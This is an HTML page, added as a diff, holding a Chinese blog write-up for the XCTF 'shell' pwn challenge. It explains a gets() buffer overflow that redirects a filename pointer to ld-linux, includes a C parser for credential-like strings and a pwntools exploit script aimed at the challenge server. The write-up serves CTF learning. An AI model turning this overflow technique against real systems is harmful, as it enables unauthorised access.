@@ -1,0 +1,103 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>XCTF-shell-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="一道 8 分题，其实也没多难，就是思路很骚。我没想到，着实可惜。 读入全部使用 gets，随便溢出。我们需要的是把 v16 置为 1，自然的思路是通过溢出实现"><meta property="og:image" content><meta property="og:title" content="XCTF-shell-WP"><meta property="og:description" content="一道 8 分题，其实也没多难，就是思路很骚。我没想到，着实可惜。 读入全部使用 gets，随便溢出。我们需要的是把 v16 置为 1，自然的思路是通过溢出实现"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1135.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-03T19:00:00+00:00"><meta property="article:modified_time" content="2021-03-03T19:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XCTF-shell-WP"><meta name=twitter:description content="一道 8 分题，其实也没多难，就是思路很骚。我没想到，着实可惜。 读入全部使用 gets，随便溢出。我们需要的是把 v16 置为 1，自然的思路是通过溢出实现"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>XCTF-shell-WP</h1><div class=meta>Posted on Mar 3, 2021</div></div><section class=body><p>一道 8 分题，其实也没多难，就是思路很骚。我没想到，着实可惜。</p><p>读入全部使用 <code>gets</code>，随便溢出。我们需要的是把 <code>v16</code> 置为 1，自然的思路是通过溢出实现，但是做不到，我们能溢出的全部在它下面，所以只能尝试通过 <code>login</code> 的验证。</p><p><code>nc</code> 一下服务器 <code>ls</code>，发现根本没有 <code>creds.txt</code> 这个文件，再考虑到 <code>filename</code> 这个变量是可以通过溢出来修改的，题目提供了一个 <code>ld</code>，就可以尝试修改 <code>filename</code>，使它指向 <code>/lib64/ld-linux-x86-64.so.2</code> 这个字符串。在程序中是有这个字符串的。</p><p>那么我们只要模拟一下对 <code>ld-linux-x86-64.so.2</code> 的读取就可以获得用户名和密码了。</p><h3 id=获取用户名和密码>获取用户名和密码</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;cstdio&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;cstring&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#902000>char</span> c[<span style=color:#40a070>10000000</span>];
+</span></span><span style=display:flex><span><span style=color:#902000>char</span> <span style=color:#666>*</span>user;
+</span></span><span style=display:flex><span><span style=color:#902000>char</span> <span style=color:#666>*</span>pass;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    FILE<span style=color:#666>*</span> p;
+</span></span><span style=display:flex><span>    p <span style=color:#666>=</span> fopen(<span style=color:#4070a0>&#34;./ld-linux-x86-64.so.2&#34;</span>,<span style=color:#4070a0>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span>(<span style=color:#666>!</span>feof(p))
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        fgets(c,<span style=color:#40a070>10000000</span>,p);
+</span></span><span style=display:flex><span>        user <span style=color:#666>=</span> strtok(c,<span style=color:#4070a0>&#34;:&#34;</span>);
+</span></span><span style=display:flex><span>        pass <span style=color:#666>=</span> strtok(<span style=color:#007020>NULL</span>,<span style=color:#4070a0>&#34;:&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span>(user <span style=color:#666>!=</span> <span style=color:#007020>NULL</span> <span style=color:#666>&amp;&amp;</span> pass <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            printf(<span style=color:#4070a0>&#34;username:&#34;</span>);
+</span></span><span style=display:flex><span>            puts(user);
+</span></span><span style=display:flex><span>            printf(<span style=color:#4070a0>&#34;password:&#34;</span>);
+</span></span><span style=display:flex><span>            puts(pass);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=获得的数据>获得的数据</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>username:ֻ$=uTi7J��GC���p�T��B���#d�&lt;I�Xx�k߱;��k�&lt;��sB�Ҋ|F
+</span></span><span style=display:flex><span>password:m�&lt;�9
+</span></span><span style=display:flex><span>ܹןkC(�����F�
+</span></span><span style=display:flex><span>username:	Version information
+</span></span><span style=display:flex><span>password:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:prelink checking
+</span></span><span style=display:flex><span>password: %s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:relocation processing
+</span></span><span style=display:flex><span>password: %s%s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:calling init
+</span></span><span style=display:flex><span>password: %s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:calling preinit
+</span></span><span style=display:flex><span>password: %s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:calling fini
+</span></span><span style=display:flex><span>password: %s [%lu]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:conflict processing
+</span></span><span style=display:flex><span>password: %s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:runtime linker statistics
+</span></span><span style=display:flex><span>password:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:  total startup time in dynamic loader
+</span></span><span style=display:flex><span>password: %s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:      number of relocations from cache
+</span></span><span style=display:flex><span>password: %lu
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:        number of relative relocations
+</span></span><span style=display:flex><span>password: %lu
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:WARNING
+</span></span><span style=display:flex><span>password: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:    entry
+</span></span><span style=display:flex><span>password: 0x%0*lx  phdr
+</span></span><span style=display:flex><span>username:runtime linker statistics
+</span></span><span style=display:flex><span>password:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:           final number of relocations
+</span></span><span style=display:flex><span>password: %lu
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>username:final number of relocations from cache
+</span></span><span style=display:flex><span>password: %lu
+</span></span></code></pre></div><p>第三组就很不错，所以有</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;111.200.241.244&#34;</span>,<span style=color:#40a070>42409</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./shell&#34;)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>u_p <span style=color:#666>=</span> <span style=color:#007020>open</span>(<span style=color:#4070a0>&#34;./u_p&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>name <span style=color:#666>=</span> <span style=color:#4070a0>&#34;prelink checking</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>
+</span></span><span style=display:flex><span>password <span style=color:#666>=</span> <span style=color:#4070a0>&#34; </span><span style=color:#70a0d0>%s</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;$ &#34;</span>,<span style=color:#4070a0>&#39;login&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Username: &#34;</span>,name)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> password<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x5c</span> <span style=color:#666>-</span> <span style=color:#40a070>0x18</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x400200</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Password: &#34;</span>,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>好简短。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
